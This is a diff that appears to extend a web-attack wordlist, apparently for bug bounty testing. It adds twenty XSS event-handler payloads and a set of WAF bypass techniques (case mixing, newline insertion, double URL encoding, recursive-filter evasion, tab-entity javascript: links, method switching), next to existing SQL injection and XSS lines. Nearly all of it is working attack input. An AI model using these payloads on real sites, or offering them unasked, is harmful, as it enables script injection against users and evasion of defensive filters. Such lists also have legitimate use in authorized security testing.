@@ -1621,3 +1621,41 @@ x”</title><img src%3dx onerror%3dalert(1)>
 %EF%BC%87)) OR 1=1--
 # Mixed-encoding — first fullwidth passes WAF, latter normalizes into a full tag
 %EF%BC%9Cscript%3Ealert(1)%3C/script%3E
+# ─── top-20 XSS event handlers (page 8 of bounty_tips_100) ───
+<x onload=alert(1) x>
+<x onerror=alert(1) x=x>
+<x onfocus=prompt(1) autofocus x=x>
+<x onclick=alert(1) x=x>
+<x onmouseover=alert(1) x=x>
+<x onchange=prompt(1) x=x>
+<x onmouseup=alert(1) x=x>
+<x onkeydown=alert(1) x=x>
+<x onkeyup=prompt(1) x=x>
+<x onkeypress=alert(1) x=x>
+<x onmove=alert(1) x=x>
+<x onabort=prompt(1) x=x>
+<x ondblclick=alert(1) x=x>
+<x onresize=alert(1) x=x>
+<x onselect=prompt(1) x=x>
+<x onscroll=alert(1) x=x>
+<x onsubmit=alert(1) x=x>
+<x onblur=prompt(1) x=x>
+<x onreset=alert(1) x=x>
+<x onunload=alert(1) x=x>
+# ─── XSS WAF bypass techniques (page 65 of bounty_tips_100) ───
+# Case-mismatch when regex is lowercase-only:
+<sCRiPt>alert(1)</sCRiPt>
+<ScRiPt>alert(1)</ScRiPt>
+# Newline break in payload:
+<script%0d%0a>alert(1)</script>
+<script%0aalert(1)</script>
+# Double-URL-encoding:
+%253cscript%253ealert(1)%253c/script%253e
+# Recursive-filter bypass (WAF removes 'script' — write it doubled so the strip leaves valid):
+<scr<script>ipt>alert(1)</scr</script>ipt>
+# HTML-entity anchor tag whitespace bypass:
+<a/href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:alert&lpar;1&rpar;">click</a>
+# Bullet-char whitespace bypass:
+<svg•onload=alert(1)>
+# Change request method (WAF only filters POST body):
+GET /?q=<script>alert(1)</script>
